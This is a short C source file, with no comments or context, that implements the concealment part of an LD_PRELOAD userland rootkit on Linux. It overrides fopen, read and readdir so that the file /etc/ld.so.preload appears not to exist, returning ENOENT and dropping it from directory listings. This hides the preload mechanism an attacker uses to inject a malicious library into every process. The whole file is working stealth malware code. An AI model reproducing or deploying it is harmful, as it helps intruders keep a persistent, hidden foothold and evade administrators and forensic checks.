#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <errno.h>
#include <sys/stat.h>
#include <limits.h>
#include <dirent.h>

#define HIDDEN_FILE "/etc/ld.so.preload"

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
    if (!orig_fopen) {
        orig_fopen = dlsym(RTLD_NEXT, "fopen");
    }

    if (strcmp(pathname, HIDDEN_FILE) == 0) {
        errno = ENOENT;
        return NULL;
    }

    return orig_fopen(pathname, mode);
}

ssize_t read(int fd, void *buf, size_t count)
{
    static ssize_t (*orig_read)(int, void *, size_t) = NULL;

    if (!orig_read) {
        orig_read = dlsym(RTLD_NEXT, "read");
    }

    char path[PATH_MAX];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    char actual_path[PATH_MAX];
    ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1);

    if (len > 0) {
        actual_path[len] = '\0';
        if (strcmp(actual_path, HIDDEN_FILE) == 0) {
            errno = ENOENT;
            return -1;
        }
    }

    return orig_read(fd, buf, count);
}

struct dirent *(*orig_readdir)(DIR *dirp);
struct dirent *readdir(DIR *dirp)
{
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, "ld.so.preload") != 0) {
            return entry;
        }
    }
    return NULL;
}
